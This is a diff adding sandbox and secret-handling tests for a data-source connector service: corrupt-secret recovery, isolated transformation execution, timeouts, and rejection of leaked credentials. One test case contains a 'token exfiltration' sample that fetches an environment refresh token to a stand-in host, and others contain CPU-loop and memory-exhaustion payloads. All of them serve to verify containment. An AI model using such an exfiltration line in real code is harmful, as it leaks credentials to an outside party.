@@ -15,6 +15,7 @@ import { SourceReadService, publicSnapshot } from '../src/sources/source-read.se
 import { SourceWorkerService } from '../src/sources/source-worker.service';
 import { SOURCE_LIMITS, SOURCE_REFRESH } from '../src/sources/source-job';
 import { canonicalJson, sha256 } from '../src/publications/publication-content';
+import { isolationDiagnostics } from '../src/isolation/isolated-executor';
 
 const root = resolve(import.meta.dir, '..');
 const signal = () => new AbortController().signal;
@@ -308,6 +309,89 @@ describe('WP-21 SQLite sources and durable connector execution', () => {
     expect(await store.claim('same-job-retry', new Date(failed.availableAt.getTime() + 1), { eventId: event.eventId })).toBeNull();
   });
 
+  test.each(['disable', 'clear', 'rotate'])('WP-22 corrupt-secret recovery permits %s with unchanged public fields', async action => {
+    const transformationCode = 'return $.value;';
+    const created = await sources.create(command({ secret: 'original-' + randomUUID(), transformationCode, timeoutMs: 2500 }));
+    const id = created.definition.sourceDefinitionId, oldReference = created.definition.secretReferences.provider;
+    await prisma.sourceSecret.update({ where: { id: oldReference }, data: { ciphertext: 'invalid-encrypted-format' } });
+    const replacement = 'replacement-' + randomUUID();
+    const recovery = action === 'disable' ? { enabled: false } : { secret: action === 'clear' ? null : replacement };
+    const started = isolationDiagnostics().started;
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 2500,
+      // Key order is immaterial, but data values and the preserved code are not.
+      configuration: { data: { value: 7, label: 'persisted fixture' } }, ...recovery }));
+    expect(updated.definition).toMatchObject({ definitionVersion: 2, transformationCode, timeoutMs: 2500 });
+    expect(updated.definition.configuration).toEqual(command().configuration);
+    expect(isolationDiagnostics().started).toBe(started);
+    expect(await prisma.outboxEvent.findUnique({ where: { eventId: created.eventId! } })).toMatchObject({ status: 'delivered' });
+    if (action === 'disable') {
+      expect(updated.enabled).toBe(false);
+      expect(updated.eventId).toBeNull();
+      expect(updated.definition.secretReferences.provider).toBe(oldReference);
+      expect(await prisma.outboxEvent.count({ where: { aggregateId: id, status: 'pending' } })).toBe(0);
+      expect(await prisma.sourceSecret.count()).toBe(1);
+    } else {
+      if (action === 'clear') {
+        expect(updated.definition.secretReferences).toEqual({});
+        expect(await prisma.sourceSecret.count()).toBe(1);
+      } else {
+        expect(updated.definition.secretReferences.provider).not.toBe(oldReference);
+        const rotated = await prisma.sourceSecret.findUniqueOrThrow({ where: { id: updated.definition.secretReferences.provider! } });
+        expect(encryption.decrypt(rotated.ciphertext) === replacement).toBe(true);
+        expect(await prisma.sourceSecret.count()).toBe(2);
+      }
+      const event = await claim(updated.eventId);
+      expect(await worker.execute(event, signal())).toBe('completed');
+      expect(await store.ack(event)).toBe(true);
+      expect((await reads.read(id)).snapshot).toMatchObject({ data: 7, freshness: { state: 'fresh' } });
+    }
+    expect(JSON.stringify(await reads.read(id))).not.toContain('invalid-encrypted-format');
+    expect(JSON.stringify(await reads.read(id))).not.toContain(replacement);
+    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
+  });
+
+  test('WP-22 corrupt-secret recovery rejects public changes and ordinary updates without writes', async () => {
+    const created = await sources.create(command({ secret: 'original-' + randomUUID(), transformationCode: 'return $.value;' }));
+    const id = created.definition.sourceDefinitionId;
+    await prisma.sourceSecret.update({ where: { id: created.definition.secretReferences.provider }, data: { ciphertext: 'invalid-encrypted-format' } });
+    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
+    const secrets = await prisma.sourceSecret.findMany(), events = await prisma.outboxEvent.findMany();
+    const jobs = await prisma.sourceRefreshJob.findMany();
+    const edits = [
+      { transformationCode: 'return "changed";' }, { transformationCode: null },
+      { configuration: { data: { label: 'new public data', value: 7 } } },
+      { name: 'Changed source' }, { connectorType: 'failure' }, { refreshIntervalSeconds: 61 },
+      { timeoutMs: 501 }, { concurrencyGroup: 'new-provider' },
+    ];
+    for (const recovery of [{ enabled: false }, { secret: null }, { secret: 'replacement-' + randomUUID() }]) {
+      for (const edit of edits) {
+        await expect(sources.update(id, command({ expectedDefinitionVersion: 1, ...recovery, ...edit })))
+          .rejects.toThrow('SOURCE_SECRET_UNAVAILABLE');
+      }
+    }
+    await expect(sources.update(id, command({ expectedDefinitionVersion: 1 }))).rejects.toThrow('SOURCE_SECRET_UNAVAILABLE');
+    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
+    expect(await prisma.sourceSecret.findMany()).toEqual(secrets);
+    expect(await prisma.outboxEvent.findMany()).toEqual(events);
+    expect(await prisma.sourceRefreshJob.findMany()).toEqual(jobs);
+    expect(await prisma.sourceSnapshot.count()).toBe(0);
+  });
+
+  test('WP-22 corrupt-secret rotation still rejects a new secret copied in preserved code', async () => {
+    const replacement = 'replacement-' + randomUUID();
+    const created = await sources.create(command({ secret: 'original-' + randomUUID(),
+      transformationCode: 'return ' + JSON.stringify(replacement) + ';' }));
+    const id = created.definition.sourceDefinitionId;
+    await prisma.sourceSecret.update({ where: { id: created.definition.secretReferences.provider }, data: { ciphertext: 'invalid-encrypted-format' } });
+    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
+    const events = await prisma.outboxEvent.findMany();
+    await expect(sources.update(id, command({ expectedDefinitionVersion: 1, secret: replacement })))
+      .rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
+    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
+    expect(await prisma.sourceSecret.count()).toBe(1);
+    expect(await prisma.outboxEvent.findMany()).toEqual(events);
+  });
+
   test('two clients enforce global 4, provider 2 and connector 2 concurrent claims', async () => {
     const combinations = [
       ['fixture', 'provider-a'], ['fixture', 'provider-a'], ['fixture', 'provider-b'],
@@ -513,5 +597,191 @@ describe('WP-21 SQLite sources and durable connector execution', () => {
     expect(await prisma.sourceSecret.count()).toBe(2);
     await expect(sources.refresh(id)).rejects.toThrow('SOURCE_DISABLED');
     expect(await prisma.outboxEvent.count({ where: { status: 'pending' } })).toBe(0);
+  });
+
+  test('WP-22 transforms only normalized data in a real child and never during API reads or commands', async () => {
+    const initial = isolationDiagnostics().started;
+    const secret = 'provider-' + randomUUID();
+    const transformationCode = 'return { doubled: $.value * 2, inputKeys: Object.keys($).sort(), host: typeof process, configuration: typeof $.configuration };';
+    const created = await sources.create(command({ secret, transformationCode, timeoutMs: 2500 }));
+    const id = created.definition.sourceDefinitionId;
+    expect(created.definition.transformationCode).toBe(transformationCode);
+    expect((await reads.read(id)).snapshot).toBeNull();
+    await reads.list();
+    expect(isolationDiagnostics().started).toBe(initial);
+    const event = await claim(created.eventId);
+    expect(await worker.execute(event, signal())).toBe('completed');
+    expect(await store.ack(event)).toBe(true);
+    const state = await reads.read(id);
+    expect(state.snapshot).toMatchObject({ freshness: { state: 'fresh' }, definitionVersion: 1,
+      connectorVersion: 'builtin-fixture-v1+pure-js-v1',
+      data: { doubled: 14, inputKeys: ['label', 'value'], host: 'undefined', configuration: 'undefined' } });
+    expect(isolationDiagnostics()).toMatchObject({ started: initial + 1, active: 0, pending: 0, pids: [] });
+    expect(JSON.stringify(state)).not.toContain(secret);
+    expect(JSON.stringify(await prisma.outboxEvent.findMany())).not.toContain(transformationCode);
+    await Promise.all(Array.from({ length: 10 }, () => reads.read(id)));
+    expect(isolationDiagnostics().started).toBe(initial + 1);
+  });
+
+  test('WP-22 missing code preserves a definition, explicit null clears it, and invalid CAS has no effects', async () => {
+    const created = await sources.create(command());
+    const id = created.definition.sourceDefinitionId;
+    expect(created.definition.transformationCode).toBeUndefined();
+    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).transformationCode).toBeNull();
+    const withCode = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode: 'return $.value;' }));
+    expect(withCode.definition).toMatchObject({ definitionVersion: 2, transformationCode: 'return $.value;' });
+    const kept = await sources.update(id, command({ expectedDefinitionVersion: 2 }));
+    expect(kept.definition).toMatchObject({ definitionVersion: 3, transformationCode: 'return $.value;' });
+    const before = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
+    const eventCount = await prisma.outboxEvent.count();
+    await expect(sources.update(id, command({ expectedDefinitionVersion: 2, transformationCode: 'return "obsolete";' }))).rejects.toThrow('SOURCE_VERSION_CONFLICT');
+    for (const transformationCode of [false, 42, [], {}, ' '.repeat(10_001)]) {
+      await expect(sources.create(command({ transformationCode }))).rejects.toThrow('SOURCE_INVALID_COMMAND');
+      await expect(sources.update(id, command({ expectedDefinitionVersion: 3, transformationCode }))).rejects.toThrow('SOURCE_INVALID_COMMAND');
+    }
+    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(before);
+    expect(await prisma.outboxEvent.count()).toBe(eventCount);
+    const cleared = await sources.update(id, command({ expectedDefinitionVersion: 3, transformationCode: null }));
+    expect(cleared.definition.transformationCode).toBeUndefined();
+    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).transformationCode).toBeNull();
+    expect(await prisma.sourceDefinition.count()).toBe(1);
+  });
+
+  test('WP-22 rejects credential copies in new or preserved code and rolls back all writes', async () => {
+    const secret = 'provider-"slash\\-' + randomUUID();
+    const existing = await sources.create(command({ secret }));
+    const id = existing.definition.sourceDefinitionId;
+    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
+    const initialEvents = await prisma.outboxEvent.findMany();
+    for (const transformationCode of ['// ' + secret + '\nreturn null;', 'return ' + JSON.stringify(secret) + ';']) {
+      await expect(sources.create(command({ secret, transformationCode }))).rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
+      for (const change of [{}, { secret: null }, { secret: 'replacement-' + randomUUID() }]) {
+        await expect(sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, ...change })))
+          .rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
+      }
+    }
+    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
+    expect(await prisma.outboxEvent.findMany()).toEqual(initialEvents);
+    expect(await prisma.sourceSecret.count()).toBe(1);
+    const futureSecret = 'future-secret-' + randomUUID();
+    const codeOnly = await sources.create(command({ transformationCode: 'return ' + JSON.stringify(futureSecret) + ';', enabled: false }));
+    await expect(sources.update(codeOnly.definition.sourceDefinitionId,
+      command({ expectedDefinitionVersion: 1, secret: futureSecret, enabled: false }))).rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
+    expect(await prisma.sourceSecret.count()).toBe(1);
+    expect((await reads.read(codeOnly.definition.sourceDefinitionId)).definition.definitionVersion).toBe(1);
+  });
+
+  test.each([
+    ['CPU loop', 'while(true){}', 'SOURCE_TIMEOUT'],
+    ['aggregate heap', 'const a=[];for(let i=0;i<2000;i++)a.push(new Array(10000).fill(i));return a.length;', 'SOURCE_TRANSFORM_FAILED'],
+    ['token exfiltration', 'return fetch("https://example.invalid/exfil?token="+process.env.PROVIDER_REFRESH_TOKEN);', 'SOURCE_TRANSFORM_FAILED'],
+    ['serialization getter', 'return {get value(){while(true){}}};', 'SOURCE_TRANSFORM_FAILED'],
+    ['custom prototype', 'return Object.create({secret:"untrusted"});', 'SOURCE_TRANSFORM_FAILED'],
+  ])('WP-22 %s failure retains immutable last-good data and records a bounded retry', async (_name, transformationCode, errorCode) => {
+    const { id, row } = await executeFresh({ secret: 'provider-' + randomUUID() });
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, timeoutMs: 2500 }));
+    const event = await claim(updated.eventId);
+    const started = performance.now();
+    expect(await worker.execute(event, signal())).toBe('failed');
+    expect(performance.now() - started).toBeLessThan(3500);
+    const state = await reads.read(id);
+    expect(state.snapshot).toMatchObject({ revision: 2, definitionVersion: 2, freshness: { state: 'stale' },
+      data: row.data, contentHash: row.contentHash, error: { code: errorCode, retryable: true } });
+    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
+    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).latestValidSnapshotId).toBe(row.snapshotId);
+    expect(await prisma.outboxEvent.findUnique({ where: { eventId: event.eventId } })).toMatchObject({
+      status: 'pending', lastError: JSON.stringify({ code: errorCode, correlationId: event.eventId }),
+    });
+    expect(await prisma.outboxEffect.count({ where: { eventId: event.eventId } })).toBe(0);
+    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
+  });
+
+  test('WP-22 revalidates transformed data against the connector credential before persistence', async () => {
+    const secret = 'synthetic-' + randomUUID();
+    const { id, row } = await executeFresh({ secret });
+    // The code reconstructs an output sentinel; no secret is sent through stdin.
+    const middle = Math.floor(secret.length / 2);
+    const transformationCode = 'return {value:' + JSON.stringify(secret.slice(0, middle)) + '+' + JSON.stringify(secret.slice(middle)) + '};';
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, transformationCode, timeoutMs: 2500 }));
+    const event = await claim(updated.eventId);
+    expect(await worker.execute(event, signal())).toBe('failed');
+    const snapshots = await prisma.sourceSnapshot.findMany();
+    expect(JSON.stringify(snapshots)).not.toContain(secret);
+    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
+      error: { code: 'SOURCE_TRANSFORM_FAILED' } });
+  });
+
+  test('WP-22 transformation retries open the circuit and stop after the fixed attempt budget', async () => {
+    const { id, row } = await executeFresh();
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1,
+      transformationCode: 'throw new Error("INTERNAL_ATTACK_SENTINEL");', timeoutMs: 2500 }));
+    let due = new Date();
+    for (let attempt = 1; attempt <= 5; attempt++) {
+      const event = await claim(updated.eventId, due);
+      expect(event.attempts).toBe(attempt);
+      expect(await worker.execute(event, signal())).toBe('failed');
+      const saved = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: event.eventId } });
+      expect(saved.status).toBe(attempt < 5 ? 'pending' : 'dead-letter');
+      expect(saved.lastError).toBe(JSON.stringify({ code: 'SOURCE_TRANSFORM_FAILED', correlationId: event.eventId }));
+      due = saved.availableAt;
+      const state = await reads.read(id);
+      expect(state.snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
+        error: { code: 'SOURCE_TRANSFORM_FAILED', retryable: attempt < 5 } });
+      if (attempt >= 3) expect(state.state.circuitOpenUntil).not.toBeNull();
+    }
+    expect(await prisma.sourceSnapshot.count()).toBe(6);
+    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
+    expect(await prisma.sourceRefreshJob.findUnique({ where: { eventId: updated.eventId! } })).toMatchObject({ completedAt: expect.any(Date) });
+    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
+  }, 15_000);
+
+  test('WP-22 connector and transformation share the source timeout', async () => {
+    const { id, row } = await executeFresh();
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, connectorType: 'slow',
+      configuration: { data: { value: 'late' }, delayMs: 700 }, timeoutMs: 1000, transformationCode: 'while(true){}' }));
+    const started = performance.now(), before = isolationDiagnostics().started;
+    expect(await worker.execute(await claim(updated.eventId), signal())).toBe('failed');
+    const elapsed = performance.now() - started;
+    expect(elapsed).toBeGreaterThanOrEqual(950);
+    expect(elapsed).toBeLessThan(1350);
+    expect(isolationDiagnostics()).toMatchObject({ started: before + 1, active: 0, pending: 0, pids: [] });
+    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
+      error: { code: 'SOURCE_TIMEOUT' } });
+  });
+
+  test('WP-22 a version change during a child run fences stale transformation output', async () => {
+    const { id, row } = await executeFresh();
+    const old = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 2500,
+      transformationCode: 'const until=Date.now()+500;while(Date.now()<until){};return {value:"obsolete"};' }));
+    const oldEvent = await claim(old.eventId), running = worker.execute(oldEvent, signal());
+    const deadline = Date.now() + 1000;
+    while (isolationDiagnostics().active === 0 && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 5));
+    expect(isolationDiagnostics().active).toBe(1);
+    const current = await sources.update(id, command({ expectedDefinitionVersion: 2, timeoutMs: 2500,
+      transformationCode: 'return {value:"current"};' }));
+    expect(await running).toBe('completed');
+    expect(await store.ack(oldEvent)).toBe(true);
+    expect(await prisma.sourceSnapshot.count()).toBe(1);
+    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
+    const currentEvent = await claim(current.eventId);
+    expect(await worker.execute(currentEvent, signal())).toBe('completed');
+    expect(await store.ack(currentEvent)).toBe(true);
+    expect((await reads.read(id)).snapshot).toMatchObject({ revision: 2, definitionVersion: 3,
+      data: { value: 'current' }, connectorVersion: 'builtin-fixture-v1+pure-js-v1' });
+    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
+  });
+
+  test('WP-22 parent abort terminates a transformation before recording the stale attempt', async () => {
+    const { id, row } = await executeFresh();
+    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 7500, transformationCode: 'while(true){}' }));
+    const event = await claim(updated.eventId), parent = new AbortController();
+    const running = worker.execute(event, parent.signal), deadline = Date.now() + 1000;
+    while (isolationDiagnostics().active === 0 && Date.now() < deadline) await new Promise(resolve => setTimeout(resolve, 5));
+    expect(isolationDiagnostics().active).toBe(1);
+    parent.abort();
+    expect(await running).toBe('failed');
+    expect((await reads.read(id)).snapshot).toMatchObject({ data: row.data, freshness: { state: 'stale' },
+      error: { code: 'SOURCE_ABORTED' } });
+    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
   });
 });
